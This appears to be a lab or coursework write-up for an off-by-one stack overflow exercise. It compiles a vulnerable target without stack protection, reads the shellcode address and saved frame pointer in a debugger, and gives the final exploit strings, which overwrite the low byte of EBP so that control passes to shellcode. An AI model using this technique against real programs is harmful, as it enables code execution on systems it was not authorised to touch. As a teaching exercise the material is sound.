# Problem 2

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# Solution

## Step 1: Compile

```bash
gcc -fno-stack-protector -O0 -ggdb3 -o obo-exploit-1-target obo-exploit-1-target.c
```

## Step 2: Dry run

```bash
./obo-exploit-1-target AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\00
```

Note the addres of shellcode.
Here, "0x80496c0".

Note EBP:
Framepointer before copy: "bffff7b8"

## Step 3: Generate exploit string.

Hex representation of "0x80496c0" in little endien format: "\xc0\x96\x04\x08"
We will put this value in our exploit string and overwrite the value of EBP such that, EBP will point to the address of shell code i.e. "0x80496c0"

Using off-by-one exploit, we can overwrite last 2 digits of the EBP address. i.e. We can put desrised value at "--" in bffff7--.
To do so, our exploit string should have 33rd character --.

## Step 4: Final run

```bash
./obo-exploit-1-target $(echo -e "AAAA\xc0\x96\x04\x08AAAAAAAAAAAAAAAAAAAAAAAA\x88")
```

```bash
./obo-exploit-1-target $(echo -e "AAAA\xc0\x96\x04\x08AAAAAAAAAAAAAAAAAAAAAAAA\x78") AAAA
```

### Helpful commands

x/40x $esp
i r ebp
